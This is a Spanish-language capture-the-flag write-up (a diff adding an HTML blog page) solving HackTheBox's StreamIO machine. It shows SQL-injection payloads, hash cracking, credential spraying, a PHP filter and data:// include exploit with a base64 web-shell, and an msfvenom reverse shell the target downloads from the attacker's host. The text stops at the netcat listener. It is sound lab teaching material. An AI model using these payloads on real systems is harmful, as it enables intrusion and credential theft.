@@ -1,0 +1,837 @@
+<!--
+<!DOCTYPE html>
+<html>
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width initial-scale=1" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="robots" content="noindex">
+
+  <title>Writeup HackTheBox StreamIO</title>
+
+  <meta name="description" content="Resolución de la máquina StreamIO de la plataforma de HackTheBox">
+  <meta name="author" content="GatoGamer1155">
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Writeup HackTheBox StreamIO">
+  <meta name="twitter:description" content="Resolución de la máquina StreamIO de la plataforma de HackTheBox">
+  <meta name="twitter:creator" content="GatoGamer1155">  
+  <meta name="twitter:image" content="https://raw.githubusercontent.com/GatoGamer1155/Imagenes-Repositorios/main/ni/streamio.png" />
+
+  <meta property="og:site_name" content="GatoGamer1155" />
+  <meta property="og:type" content="article">
+  <meta property="og:title" content="Writeup HackTheBox StreamIO">
+  <meta property="og:description" content="Resolución de la máquina StreamIO de la plataforma de HackTheBox">
+  <meta property="og:image" content="https://raw.githubusercontent.com/GatoGamer1155/Imagenes-Repositorios/main/ni/streamio.png" />
+
+  <link rel="manifest" href="/images/favicons/manifest.json">
+  <link rel="shortcut icon" type="image/png" sizes="64x64" href="https://raw.githubusercontent.com/GatoGamer1155/Imagenes-Repositorios/main/ni/streamio.png">
+
+  <meta name="msapplication-TileColor" content="#ffc40d">
+  <meta name="msapplication-TileImage" content="/images/favicons/mstile-144x144.png">
+  <meta name="theme-color" content="#ffffff">
+  
+  <meta name="msapplication-TileColor" content="#ffc40d">
+  <meta name="msapplication-TileImage" content="/images/favicons/mstile-144x144.png">
+  <meta name="theme-color" content="#ffffff">
+
+  <link rel="stylesheet" href="/css/main.css?1678854914750547280">
+  <link rel="alternate" type="application/rss+xml" title="Writeup HackTheBox StreamIO" href="/feed.xml">
+</head>
+
+  <body style="background-color: #282828;">
+  
+    <span class="mobile btn-mobile-menu">
+      <i class="icon icon-list btn-mobile-menu__icon"></i>
+      <i class="icon icon-x-circle btn-mobile-close__icon hidden"></i>
+    </span>
+
+<header class="panel-cover" style="background-image: url(/images/cover.jpg)">
+
+  <div class="panel-main">
+    <div class="panel-main__inner panel-inverted">
+      <div class="panel-main__content">
+
+          <img src="/images/profile.jpg" class="user-image zoomable" alt="GatoGamer1155">
+          <h1 class="panel-cover__title panel-title scale-up-center">GatoGamer1155</h1>
+
+        <hr class="panel-cover__divider">
+        <p class="panel-cover__description slide-top">Entusiasta del Hacking y CTFs</p>
+        <hr class="panel-cover__divider panel-cover__divider--secondary">
+
+        <div class="navigation-wrapper">
+         <nav class="cover-navigation cover-navigation--primary">
+            <ul class="navigation">
+              <li class="navigation__item grow"><a href="/htb" title="GatoGamer1155" class="blog-button">HackTheBox</a></li>
+            </ul>
+          </nav>
+
+          <nav class="cover-navigation navigation--social">
+            <ul class="navigation">
+              
+              <li class="navigation__item grow">
+                <a href="https://github.com/gatogamer1155" title="Github" target="_blank">
+                  <i class="icon icon-social-github"></i>
+                  <span class="label">GitHub</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="https://twitter.com/gatogamer1155" title="Twitter" target="_blank">
+                  <i class="icon icon-social-twitter"></i>
+                  <span class="label">Twitter</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="https://instagram.com/gatogamer1155" title="Instagram" target="_blank">
+                  <i class="icon icon-social-instagram"></i>
+                  <span class="label">Instagram</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="https://youtube.com/@gatogamer1155" title="Youtube" target="_blank">
+                  <i class="icon icon-social-youtube"></i>
+                  <span class="label">Youtube</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="mailto:gatogamer1155@gmail.com" title="Correo Electronico" target="_blank">
+                  <i class="icon icon-mail"></i>
+                  <span class="label">Email</span>
+                </a>
+              </li>
+
+            </ul>
+          </nav>
+        </div>
+      </div>
+    </div>
+
+    <div class="panel-cover--overlay"></div>
+  </div>
+</header>
+    <br>
+    <div class="content-wrapper">
+      <div class="content-wrapper__inner">
+        <article class="post-container post-container--single">
+    <div class="izquierda">
+      <h3 class="post-title">Contenido</h3><br>
+      <ul>
+        <li><a href="#enumeration">Enumeración</a></li>
+        <li><a href="#shell-yoshihide">Shell - yoshihide</a></li>
+        <li><a href="#shell-nikk37">Shell - nikk37</a></li>
+        <li><a href="#shell-administrator">Shell - Administrator</a></li>
+      </ul>
+  </div>
+
+  <header class="post-header slide-top">
+    <h4 class="post-title">HackTheBox</h4>
+    <picture><img src="https://raw.githubusercontent.com/GatoGamer1155/Imagenes-Repositorios/main/ni/streamio.png" style="float: right; margin-right:0px; margin-left:0px; height:60px;" class="include_image zoomable"/></picture>
+    <h2 class="post-title">StreamIO</h2><br>
+  </header>
+  
+<section class="post" id="enumeration">
+<br><h3 class="post-title">Enumeración</h3><br>
+
+<p class="plain-text">Iniciamos la máquina escaneando los puertos de la máquina con <code class="language-plaintext highlighter-rouge">nmap</code> donde encontramos varios puertos abiertos, entre ellos el <code class="language-plaintext highlighter-rouge">80</code> que corre un servicio <code class="language-plaintext highlighter-rouge">http</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ nmap </span><span class="p">
+53/tcp    open  domain
+80/tcp    open  http
+88/tcp    open  kerberos-sec
+135/tcp   open  msrpc
+139/tcp   open  netbios-ssn
+389/tcp   open  ldap
+443/tcp   open  https
+445/tcp   open  microsoft-ds
+464/tcp   open  kpasswd5
+593/tcp   open  http-rpc-epmap
+636/tcp   open  ldapssl
+3268/tcp  open  globalcatLDAP
+3269/tcp  open  globalcatLDAPssl
+5985/tcp  open  wsman
+9389/tcp  open  adws
+49667/tcp open  unknown
+49677/tcp open  unknown
+49678/tcp open  unknown
+49708/tcp open  unknown
+54782/tcp open  unknown</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Con <code class="language-plaintext highlighter-rouge">crackmapexec</code> podemos obtener información de la maquina asi como el <code class="language-plaintext highlighter-rouge">dominio</code> que es <code class="language-plaintext highlighter-rouge">streamio.htb</code> ademas del nombre que es el propio <code class="language-plaintext highlighter-rouge">DC</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ crackmapexec </span><span class="p">smb 10.10.11.158
+</span><span class="az">SMB         </span><span class="p">10.10.11.158  445    DC               </span><span class="az">[*] </span><span class="p">Windows 10.0 Build 17763 x64 (name:DC) (domain:streamIO.htb) (signing:True) (SMBv1:False)  </span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Para posibles proximos ataques o solo por comodidad agregaremos el <code class="language-plaintext highlighter-rouge">dominio</code> al <code class="language-plaintext highlighter-rouge">/etc/hosts</code> ademas el <code class="language-plaintext highlighter-rouge">nombre</code> de la máquina que es el DC como otro dominio</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ echo </span><span class="am">"10.10.11.158 streamio.htb dc.streamio.htb" </span><span class="p">| </span><span class="ve">sudo tee</span><span class="p"> -a /etc/hosts  </span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Esta abierto el puerto <code class="language-plaintext highlighter-rouge">80</code> con un servicio <code class="language-plaintext highlighter-rouge">http</code> sin embargo si lo abrimos la web en el navegador nos muestra simplemente la página que viene por defecto en <code class="language-plaintext highlighter-rouge">IIS</code></p>
+<a href="/htb/streamio/1.png" target="_blank"><div><p><img src="/htb/streamio/1.png"></p></div></a>
+
+<p class="plain-text">Sin embargo también esta abierto el puerto <code class="language-plaintext highlighter-rouge">443</code> asi que también corre una web por <code class="language-plaintext highlighter-rouge">https</code>, la abrimos con https y vemos una pagina de streaming <code class="language-plaintext highlighter-rouge">peliculas</code> onnline</p>
+<a href="/htb/streamio/2.png" target="_blank"><div><p><img src="/htb/streamio/2.png"></p></div></a>
+
+<p class="plain-text">Ya que tenemos un dominio podemos usar <code class="language-plaintext highlighter-rouge">wfuzz</code> para aplicando fuerza bruta buscar un <code class="language-plaintext highlighter-rouge">subdominio</code> valido, en este caso <code class="language-plaintext highlighter-rouge">watch</code> devuelve un contenido diferente</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ wfuzz</span><span class="p"> -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H </span><span class="am">"Host: FUZZ.streamio.htb" </span><span class="p">-u https://streamio.htb -t 100 --hc 404  
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: https://streamio.htb/
+Total requests: 4989
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload
+=====================================================================
+
+000002268:   </span><span class="ve">200</span><span class="p">        78 L     245 W      2829 Ch     "watch"</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Para que el ordenador sepa a donde resolver al apuntar a <code class="language-plaintext highlighter-rouge">watch.streamio.htb</code> agregamos el dominio al archivo <code class="language-plaintext highlighter-rouge">/etc/hosts</code> con la ip de la máquina victima</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ echo </span><span class="am">"10.10.11.158 watch.streamio.htb"</span><span class="p"> | </span><span class="ve">sudo tee</span><span class="p"> -a /etc/hosts  </span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Al abrir la web por <code class="language-plaintext highlighter-rouge">https</code> bajo el dominio <code class="language-plaintext highlighter-rouge">watch.streamio.htb</code> podemos ver una pagina donde podemos introducir el <code class="language-plaintext highlighter-rouge">correo</code> para añadir una suscripción</p>
+<a href="/htb/streamio/3.png" target="_blank"><div><p><img src="/htb/streamio/3.png"></p></div></a>
+
+<p class="plain-text">Fuzzeando por archivos con extensiones <code class="language-plaintext highlighter-rouge">php</code> encontramos ademas de un <code class="language-plaintext highlighter-rouge">blocked</code> un <code class="language-plaintext highlighter-rouge">search</code> ademas del clasico <code class="language-plaintext highlighter-rouge">index</code> que es el que contiene la página principal</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ wfuzz</span><span class="p"> -c -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -u https://watch.streamio.htb/FUZZ.php -t 100 --hc 404  
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: https://watch.streamio.htb/FUZZ.php
+Total requests: 26584
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload
+=====================================================================
+
+000000012:   </span><span class="ve">200</span><span class="p">        7193 L   19558 W    253887 Ch   "search" 
+000000238:   </span><span class="ve">200</span><span class="p">        78 L     245 W      2829 Ch     "index"  
+000006588:   </span><span class="ve">200</span><span class="p">        19 L     47 W       677 Ch      "blocked"</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Este es un <code class="language-plaintext highlighter-rouge">buscador</code> de peliculas donde podemos introducir y buscar una pelicula</p>
+<a href="/htb/streamio/4.png" target="_blank"><div><p><img src="/htb/streamio/4.png"></p></div></a>
+
+<p class="plain-text">Despues de probar varias cosas en la web encontramos una <code class="language-plaintext highlighter-rouge">inyección sql</code> donde podemos ver reflejadas las columnas <code class="language-plaintext highlighter-rouge">2</code> y <code class="language-plaintext highlighter-rouge">3</code> en este caso usaremos la <code class="language-plaintext highlighter-rouge">2</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="s">test' </span><span class="o">union select </span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="mi">5</span><span class="p">,</span><span class="mi">6</span><span class="p">;</span><span class="c1">-- -  </span>
+</code></pre></div></div><br>
+<a href="/htb/streamio/5.png" target="_blank"><div><p><img src="/htb/streamio/5.png"></p></div></a>
+
+<p class="plain-text">Seleccionamos el campo <code class="language-plaintext highlighter-rouge">name</code> de <code class="language-plaintext highlighter-rouge">sysdatabases</code>, al hacer esto nos devolvera todas las <code class="language-plaintext highlighter-rouge">bases de datos</code> existentes en el servidor, nos quedaremos con <code class="language-plaintext highlighter-rouge">streamio</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="s">test' </span><span class="o">union select </span><span class="mi">1</span><span class="p">,name,</span><span class="mi">3</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="mi">5</span><span class="p">,</span><span class="mi">6 </span><span class="o">from </span><span class="p">sysdatabases;</span><span class="c1">-- -  </span>
+</code></pre></div></div><br>
+<a href="/htb/streamio/6.png" target="_blank"><div><p><img src="/htb/streamio/6.png"></p></div></a>
+
+<p class="plain-text">Ya que tenemos el nombre de la base de datos podemos enumerar sus <code class="language-plaintext highlighter-rouge">tablas</code>, en este caso solo encontramos 2 <code class="language-plaintext highlighter-rouge">movies</code> y la que parece mas prometedora <code class="language-plaintext highlighter-rouge">users</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="s">test' </span><span class="o">union select </span><span class="mi">1</span><span class="p">,name,</span><span class="mi">3</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="mi">5</span><span class="p">,</span><span class="mi">6 </span><span class="o">from </span><span class="mi">streamio</span><span class="p">.</span><span class="mi">sys</span><span class="p">.tables;</span><span class="c1">-- -  </span>
+</code></pre></div></div><br>
+<a href="/htb/streamio/7.png" target="_blank"><div><p><img src="/htb/streamio/7.png"></p></div></a>
+
+<p class="plain-text">Sabemos que existe una tabla <code class="language-plaintext highlighter-rouge">users</code>, podemos enumerar las <code class="language-plaintext highlighter-rouge">columnas</code> de ella donde lo que parece ser interesante es simplemente <code class="language-plaintext highlighter-rouge">username</code> y <code class="language-plaintext highlighter-rouge">password</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="s">test' </span><span class="o">union select </span><span class="mi">1</span><span class="p">,name,</span><span class="mi">3</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="mi">5</span><span class="p">,</span><span class="mi">6 </span><span class="o">from </span><span class="mi">streamio</span><span class="p">.</span><span class="mi">sys</span><span class="p">.columns </span><span class="o">where </span><span class="p">object_id </span><span class="o">= </span><span class="p">object_id(</span><span class="s">'users'</span><span class="p">);</span><span class="c1">-- -  </span>
+</code></pre></div></div><br>
+<a href="/htb/streamio/8.png" target="_blank"><div><p><img src="/htb/streamio/8.png"></p></div></a>
+
+<p class="plain-text">Finalmente podemos dumpear ambas columnas utilizando la funcion <code class="language-plaintext highlighter-rouge">concat</code> para sus valores reflejados juntos en la misma columna que en este caso es la <code class="language-plaintext highlighter-rouge">2</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="s">test' </span><span class="o">union select </span><span class="mi">1</span><span class="p">,concat(username,password),</span><span class="mi">3</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="mi">5</span><span class="p">,</span><span class="mi">6 </span><span class="o">from </span><span class="mi">streamio</span><span class="p">.</span><span class="mi">dbo</span><span class="p">.users;</span><span class="c1">-- -  </span>
+</code></pre></div></div><br>
+<a href="/htb/streamio/12.png" target="_blank"><div><p><img src="/htb/streamio/12.png"></p></div></a>
+
+</section>
+
+<section class="post" id="shell-yoshihide">
+<br><h3 class="post-title">Shell - yoshihide</h3><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ john</span><span class="p"> -w:/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt hashes --format=Raw-MD5  
+Using default input encoding: UTF-8
+Loaded 30 password hashes with no different salts (Raw-MD5 [MD5 128/128 XOP 4x2])
+Press 'q' or Ctrl-C to abort, almost any other key for status
+</span><span class="am">highschoolmusical</span><span class="p"> (</span><span class="am">Thane</span><span class="p">)
+</span><span class="am">1physics69i</span><span class="p">       (</span><span class="am">Lenord</span><span class="p">)
+</span><span class="ro">paddpadd</span><span class="p">          (</span><span class="ro">admin</span><span class="p">)
+</span><span class="am">66boysandgirls..</span><span class="p">  (</span><span class="am">yoshihide</span><span class="p">)
+</span><span class="am">%$clara</span><span class="p">           (</span><span class="am">Clara</span><span class="p">)
+</span><span class="am">$monique$1991$</span><span class="p">    (</span><span class="am">Bruno</span><span class="p">)
+</span><span class="am">$hadoW</span><span class="p">            (</span><span class="am">Barry</span><span class="p">)
+</span><span class="am">$3xybitch</span><span class="p">         (</span><span class="am">Juliette</span><span class="p">)
+</span><span class="am">##123a8j8w5123##</span><span class="p">  (</span><span class="am">Lauren</span><span class="p">)
+</span><span class="am">!?Love?!123</span><span class="p">       (</span><span class="am">Michelle</span><span class="p">)
+</span><span class="am">!5psycho8!</span><span class="p">        (</span><span class="am">Victoria</span><span class="p">)
+</span><span class="am">!!sabrina$</span><span class="p">        (</span><span class="am">Sabrina</span><span class="p">)
+Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
+Session completed.</span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ crackmapexec </span><span class="p">smb streamio.htb -u users.txt -p passwords.txt --no-bruteforce
+</span><span class="az">SMB         </span><span class="p">streamIO.htb    445    DC               </span><span class="az">[*] </span><span class="p">Windows 10.0 Build 17763 x64 (name:DC) (domain:streamIO.htb) (signing:True) (SMBv1:False)  
+</span><span class="az">SMB         </span><span class="p">streamIO.htb    445    DC               </span><span class="ro">[-] </span><span class="p">streamIO.htb\admin:paddpadd STATUS_LOGON_FAILURE
+</span><span class="az">SMB         </span><span class="p">streamIO.htb    445    DC               </span><span class="ro">[-] </span><span class="p">streamIO.htb\Barry:$hadoW STATUS_LOGON_FAILURE
+</span><span class="az">SMB         </span><span class="p">streamIO.htb    445    DC               </span><span class="ro">[-] </span><span class="p">streamIO.htb\Bruno:$monique$1991$ STATUS_LOGON_FAILURE
+</span><span class="az">SMB         </span><span class="p">streamIO.htb    445    DC               </span><span class="ro">[-] </span><span class="p">streamIO.htb\Clara:%$clara STATUS_LOGON_FAILURE
+</span><span class="az">SMB         </span><span class="p">streamIO.htb    445    DC               </span><span class="ro">[-] </span><span class="p">streamIO.htb\Juliette:$3xybitch STATUS_LOGON_FAILURE
+</span><span class="az">SMB         </span><span class="p">streamIO.htb    445    DC               </span><span class="ro">[-] </span><span class="p">streamIO.htb\Lauren:##123a8j8w5123## STATUS_LOGON_FAILURE
+</span><span class="az">SMB         </span><span class="p">streamIO.htb    445    DC               </span><span class="ro">[-] </span><span class="p">streamIO.htb\Lenord:physics69i STATUS_LOGON_FAILURE
+</span><span class="az">SMB         </span><span class="p">streamIO.htb    445    DC               </span><span class="ro">[-] </span><span class="p">streamIO.htb\Michelle:!?Love?!123 STATUS_LOGON_FAILURE
+</span><span class="az">SMB         </span><span class="p">streamIO.htb    445    DC               </span><span class="ro">[-] </span><span class="p">streamIO.htb\Sabrina:!!sabrina$ STATUS_LOGON_FAILURE
+</span><span class="az">SMB         </span><span class="p">streamIO.htb    445    DC               </span><span class="ro">[-] </span><span class="p">streamIO.htb\Thane:highschoolmusical STATUS_LOGON_FAILURE
+</span><span class="az">SMB         </span><span class="p">streamIO.htb    445    DC               </span><span class="ro">[-] </span><span class="p">streamIO.htb\Victoria:!5psycho8! STATUS_LOGON_FAILURE
+</span><span class="az">SMB         </span><span class="p">streamIO.htb    445    DC               </span><span class="ro">[-] </span><span class="p">streamIO.htb\yoshihide:66boysandgirls.. STATUS_LOGON_FAILURE</span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ hydra </span><span class="p">-C credentials.txt streamio.htb https-post-form </span><span class="am">"/login.php:username=^USER^&password=^PASS^:F=failed"</span><span class="p">  
+Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting
+[DATA] max 12 tasks per 1 server, overall 12 tasks, 12 login tries
+[DATA] attacking http-post-forms://streamio.htb:443/login.php:username=^USER^&password=^PASS^:F=failed
+[</span><span class="ve">443</span><span class="p">][</span><span class="ve">http-post-form</span><span class="p">] host: </span><span class="ve">streamio.htb</span><span class="p">   login: </span><span class="ve">yoshihide</span><span class="p">   password: </span><span class="ve">66boysandgirls..</span><span class="p">
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished</span>
+</code></pre></div></div><br>
+
+<a href="/htb/streamio/9.png" target="_blank"><div><p><img src="/htb/streamio/9.png"></p></div></a>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ wfuzz</span><span class="p"> -c -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -u https://streamio.htb/FUZZ -t 100 --hc 404  
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: https://streamio.htb/FUZZ
+Total requests: 26584
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload
+=====================================================================
+
+000000003:   </span><span class="az">301</span><span class="p">        1 L      10 W       150 Ch      "admin"
+000000002:   </span><span class="az">301</span><span class="p">        1 L      10 W       151 Ch      "images"
+000000015:   </span><span class="az">301</span><span class="p">        1 L      10 W       148 Ch      "css"
+000000009:   </span><span class="az">301</span><span class="p">        1 L      10 W       147 Ch      "js"
+000000267:   </span><span class="az">301</span><span class="p">        1 L      10 W       150 Ch      "fonts"</span>
+</code></pre></div></div><br>
+
+<a href="/htb/streamio/10.png" target="_blank"><div><p><img src="/htb/streamio/10.png"></p></div></a>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ wfuzz</span><span class="p"> -c -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -u </span><span class="am">"https://streamio.htb/admin/?FUZZ="</span><span class="p"> -b </span><span class="am">"PHPSESSID=0sejb2rtbukpsp3e8lfj2biq49"</span><span class="p"> -t 100 --hh 1678  
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: https://streamio.htb/admin/?FUZZ=
+Total requests: 26584
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload
+=====================================================================
+
+000000022:   </span><span class="ve">200</span><span class="p">        62 L     160 W      2073 Ch     "user"
+000000352:   </span><span class="ve">200</span><span class="p">        398 L    916 W      12484 Ch    "staff"
+000000416:   </span><span class="ve">200</span><span class="p">        49 L     137 W      1712 Ch     "debug"
+000001059:   </span><span class="ve">200</span><span class="p">        10790L   25878 W    320235 Ch   "movie"</span>
+</code></pre></div></div><br>
+
+<a href="/htb/streamio/11.png" target="_blank"><div><p><img src="/htb/streamio/11.png"></p></div></a>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ curl</span><span class="p"> -sk </span><span class="am">"https://streamio.htb/admin/?debug=php://filter/convert.base64-encode/resource=index.php"</span><span class="p"> -b </span><span class="am">"PHPSESSID=0sejb2rtbukpsp3e8lfj2biq49"</span><span class="p"> | </span><span class="ve">grep</span><span class="p"> -oP </span><span class="am">'(?<=only)[^\t]*'</span><span class="p"> | </span><span class="ve">base64</span><span class="p"> -d | </span><span class="ve">head</span><span class="p"> -n12  
+&lt?php
+</span><span class="no">define</span><span class="p">(</span><span class="s">'included'</span><span class="p">,</span><span class="mi">true</span><span class="p">);
+</span><span class="no">session_start</span><span class="p">();
+</span><span class="o">if</span><span class="p">(</span><span class="o">!isset</span><span class="p">($_SESSION[</span><span class="s">'admin'</span><span class="p">]))
+{
+        </span><span class="no">header</span><span class="p">(</span><span class="s">'HTTP/1.1 403 Forbidden'</span><span class="p">);
+        </span><span class="o">die</span><span class="p">(</span><span class="s">"&lth1>FORBIDDEN&lt/h1>"</span><span class="p">);
+}
+$connection </span><span class="o">= array</span><span class="p">(</span><span class="s">"Database"</span><span class="o">=></span><span class="s">"STREAMIO"</span><span class="p">, </span><span class="s">"UID"</span><span class="o"> => </span><span class="s">"db_admin"</span><span class="p">, </span><span class="s">"PWD" </span><span class="o">=> </span><span class="s">'B1@hx31234567890'</span><span class="p">);  
+$handle </span><span class="o">= </span><span class="p">sqlsrv_connect(</span><span class="s">'(local)'</span><span class="p">,$connection);
+
+?></span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ wfuzz</span><span class="p"> -c -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -u </span><span class="am">"https://streamio.htb/admin/FUZZ.php"</span><span class="p"> -b </span><span class="am">"PHPSESSID=0sejb2rtbukpsp3e8lfj2biq49"</span><span class="p"> -t 100 --hc 404  
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: https://streamio.htb/admin/FUZZ.php
+Total requests: 26584
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload
+=====================================================================
+
+000000238:   </span><span class="ve">200</span><span class="p">        49 L     131 W      1678 Ch     "index"
+000000941:   </span><span class="ve">200</span><span class="p">        1 L      6 W        58 Ch       "master"</span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ curl</span><span class="p"> -sk</span><span class="am"> "https://streamio.htb/admin/?debug=php://filter/convert.base64-encode/resource=master.php"</span><span class="p"> -b </span><span class="am">"PHPSESSID=0sejb2rtbukpsp3e8lfj2biq49"</span><span class="p"> | </span><span class="ve">grep</span><span class="p"> -oP </span><span class="am">'(?<=only)[^\t]*'</span><span class="p"> | </span><span class="ve">base64</span><span class="p"> -d | </span><span class="ve">tail</span><span class="p"> -n9  
+&lt?php
+</span><span class="o">if</span><span class="p">(</span><span class="o">isset</span><span class="p">($_POST[</span><span class="s">'include'</span><span class="p">]))
+{
+</span><span class="o">if</span><span class="p">($_POST[</span><span class="s">'include'</span><span class="p">] </span><span class="o">!== </span><span class="s">"index.php"</span><span class="p"> )
+</span><span class="o">eval</span><span class="p">(</span><span class="no">file_get_contents</span><span class="p">($_POST[</span><span class="s">'include'</span><span class="p">]));  
+</span><span class="o">else
+echo</span><span class="p">(</span><span class="s">" ---- ERROR ---- "</span><span class="p">);
+}
+?></span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ echo</span><span class="p"> -n </span><span class="am">"system(\$_REQUEST['cmd']);"</span><span class="p"> | </span><span class="ve">base64</span><span class="p">  
+c3lzdGVtKCRfUkVRVUVTVFsnY21kJ10pOw==</span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ curl</span><span class="p"> -sk </span><span class="am">"https://streamio.htb/admin/?debug=master.php"</span><span class="p"> -b </span><span class="am">"PHPSESSID=0sejb2rtbukpsp3e8lfj2biq49"</span><span class="p"> --data-binary </span><span class="am">"include=data://text/plain;base64,c3lzdGVtKCRfUkVRVUVTVFsnY21kJ10pOw=="</span><span class="p"> -d </span><span class="am">"cmd=whoami"</span><span class="p"> | </span><span class="ve">grep </span><span class="p">streamio  
+streamio\yoshihide</span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ msfvenom</span><span class="p"> -p windows/x64/powershell_reverse_tcp LHOST=10.10.14.10 LPORT=443 -f exe -o shell.exe  
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x64 from the payload
+No encoder specified, outputting raw payload
+Payload size: 1891 bytes
+Final size of exe file: 8192 bytes
+Saved as: shell.exe
+
+</span><span class="ve">❯ sudo python3</span><span class="p"> -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...</span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ curl</span><span class="p"> -sk </span><span class="am">"https://streamio.htb/admin/?debug=master.php"</span><span class="p"> -b </span><span class="am">"PHPSESSID=0sejb2rtbukpsp3e8lfj2biq49"</span><span class="p"> --data-binary </span><span class="am">"include=data://text/plain;base64,c3lzdGVtKCRfUkVRVUVTVFsnY21kJ10pOw=="</span><span class="p"> -d </span><span class="am">"cmd=curl 10.10.14.10/shell.exe -o C:\ProgramData\shell.exe"</span><span class="p"> &>/dev/null  
+
+</span><span class="ve">❯ curl</span><span class="p"> -sk </span><span class="am">"https://streamio.htb/admin/?debug=master.php"</span><span class="p"> -b </span><span class="am">"PHPSESSID=0sejb2rtbukpsp3e8lfj2biq49" </span><span class="p">--data-binary </span><span class="am">"include=data://text/plain;base64,c3lzdGVtKCRfUkVRVUVTVFsnY21kJ10pOw==" </span><span class="p">-d </span><span class="am">"cmd=cmd /c C:\ProgramData\shell.exe" </span><span class="p">&>/dev/null</span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ sudo netcat</span><span class="p"> -lvnp 443
